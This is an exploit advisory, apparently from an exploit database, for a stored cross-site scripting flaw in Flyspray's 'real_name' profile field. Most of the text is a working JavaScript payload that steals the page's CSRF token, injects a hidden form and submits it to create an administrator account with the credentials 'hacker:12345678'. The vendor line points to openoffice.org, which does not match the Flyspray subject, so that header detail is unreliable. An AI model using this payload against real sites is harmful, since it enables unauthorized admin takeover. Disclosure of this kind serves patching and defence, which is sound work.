# Date: 19/04/2017
# Exploit Author: Cyril Vallicari / HTTPCS / ZIWIT
: https://www.openoffice.org
# Version: 1.0-rc4
# Tested on: Windows 7 x64 SP1 / Kali Linux
 
 
Description :
 
A vulnerability has been discovered in Flyspray , which can be
exploited by malicious people to conduct cross-site scripting attacks. Input
passed via the &#039;real_name&#039; parameter to &#039;/index.php?do=myprofile&#039; is not
properly sanitised before being returned to the user. This can be exploited
to execute arbitrary HTML and script code in a user&#039;s browser session in
context of an affected site.
 
The script is executed on the parameter page AND on any page that allow the
user to put a comment.
 
 
This XSS vector allow to execute scripts to gather the CSRF token
 
and submit a form to create a new admin
 
 
Here&#039;s the script :
 
var tok = document.getElementsByName(&#039;csrftoken&#039;)[0].value;
 
var txt = &#039;<form method="POST" id="hacked_form"
action="index.php?do=admin&area=newuser">&#039;
txt += &#039;<input type="hidden" name="action" value="admin.newuser"/>&#039;
txt += &#039;<input type="hidden" name="do" value="admin"/>&#039;
txt += &#039;<input type="hidden" name="area" value="newuser"/>&#039;
txt += &#039;<input type="hidden" name="user_name" value="hacker"/>&#039;
txt += &#039;<input type="hidden" name="csrftoken" value="&#039; + tok + &#039;"/>&#039;
txt += &#039;<input type="hidden" name="user_pass" value="12345678"/>&#039;
txt += &#039;<input type="hidden" name="user_pass2" value="12345678"/>&#039;
txt += &#039;<input type="hidden" name="real_name" value="root"/>&#039;
txt += &#039;<input type="hidden" name="email_address" value="root@root.com"/>&#039;
txt += &#039;<input type="hidden" name="verify_email_address" value="
root@root.com"/>&#039;
txt += &#039;<input type="hidden" name="jabber_id" value=""/>&#039;
txt += &#039;<input type="hidden" name="notify_type" value="0"/>&#039;
txt += &#039;<input type="hidden" name="time_zone" value="0"/>&#039;
txt += &#039;<input type="hidden" name="group_in" value="1"/>&#039;
txt += &#039;</form>&#039;
 
var d1 = document.getElementById(&#039;menu&#039;);
d1.insertAdjacentHTML(&#039;afterend&#039;, txt);
document.getElementById("hacked_form").submit();
 
This will create a new admin account, hacker:12345678
 
POC video : *https://www.youtube.com/watch?v=eCf9a0QpnPs
 
Patch : No patch yet

